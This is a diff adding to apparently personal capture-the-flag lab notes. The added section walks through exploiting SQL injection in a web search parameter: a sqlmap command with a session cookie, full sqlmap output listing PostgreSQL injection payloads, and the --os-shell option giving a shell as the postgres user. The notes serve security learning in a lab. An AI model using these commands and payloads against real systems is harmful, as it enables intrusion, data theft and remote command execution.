@@ -3,7 +3,7 @@
 |     Local    |     Remote    |
 | ------------ | ------------- |
 | 10.10.15.104 | 10.129.248.107 |
-|              |   |
+| 10.10.14.7   | 10.129.166.104 |
 |              |  |
 
 ---
@@ -270,6 +270,107 @@ cat cracked_admin.txt
 2cb42f8734ea607eefed3b70af13bbd3:qwerty789
 ```
 - It works: I used it to sign into the webpage... 
+
+## Web Page
+> http://10.129.166.104/
+
+Use the username and password to login.
+- You get a table of data which means you have a database behind the website.
+- There is a search box and if you searm on a term (whatever), you'll see there is a variable `search` in the URL.
+
+Use **Burp Suite** to capture the GET from the search you sent.
+- You'll see in the first line the parameter/variable: `search`
+- You'll see the Cookie: PHPSESSID=gtn7bvir60u6kq78qljr4dhn29
+
+## SQLMap
+
+### Search for Vulnerabilities
+
+Use **sqlmap** to check for vulnerabilities using the URL for the search and the cookie: 
+```
+sqlmap -u "http://10.129.166.104/dashboard.php?search=whatever" --cookie="PHPSESSID=gtn7bvir60u6kq78qljr4dhn29"
+```
+
+**Results:**
+
+Key line: `GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N]`
+
+```
+[*] starting @ 14:14:01 /2024-06-22/
+
+[14:14:01] [INFO] testing connection to the target URL
+[14:14:01] [INFO] testing if the target URL content is stable
+[14:14:02] [INFO] target URL content is stable
+[14:14:02] [INFO] testing if GET parameter 'search' is dynamic
+[14:14:02] [WARNING] GET parameter 'search' does not appear to be dynamic
+[14:14:02] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')
+[14:14:02] [INFO] testing for SQL injection on GET parameter 'search'
+it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
+
+for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] 
+
+[14:14:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:14:06] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[14:14:06] [INFO] testing 'Generic inline queries'
+[14:14:06] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[14:14:07] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable 
+[14:14:07] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[14:14:07] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
+[14:14:07] [INFO] testing 'PostgreSQL inline queries'
+[14:14:07] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[14:14:07] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)                                                   
+[14:14:19] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
+[14:14:19] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[14:14:30] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
+[14:14:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+
+sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
+---
+Parameter: search (GET)
+    Type: boolean-based blind
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: search=whatever' AND (SELECT (CASE WHEN (7722=7722) THEN NULL ELSE CAST((CHR(99)||CHR(100)||CHR(108)||CHR(73)) AS NUMERIC) END)) IS NULL-- tZue
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: search=whatever' AND 8836=CAST((CHR(113)||CHR(122)||CHR(107)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (8836=8836) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(112)||CHR(112)||CHR(113)) AS NUMERIC)-- wEvI
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=whatever';SELECT PG_SLEEP(5)--
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: search=whatever' AND 1745=(SELECT 1745 FROM PG_SLEEP(5))-- ClEM
+---
+[14:15:27] [INFO] the back-end DBMS is PostgreSQL
+[14:15:29] [WARNING] turning off pre-connect mechanism because of connection reset(s)
+[14:15:29] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
+web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: PostgreSQL
+[14:15:30] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.129.166.104'
+
+[*] ending @ 14:15:30 /2024-06-22/
+```
+
+### Exploit with `--os-shell` Option
+
+Same command as the vulnerability scan; just add on the option at the end:
+
+```
+sqlmap -u "http://10.129.166.104/dashboard.php?search=whatever" --cookie="PHPSESSID=gtn7bvir60u6kq78qljr4dhn29" --os-shell
+```
+
+That gives you an `os-shell>` prompt. I am the postgres user:
+```
+os-shell> whoami
+[14:21:14] [INFO] retrieved: 'postgres'
+```
+
+Find SUID programs.
+
 
 ** sqlmap is still needing to be transferred over from OneNote to this repo **
 ** --os-shell option passed to sqlmap will give you command execution via sql injection**
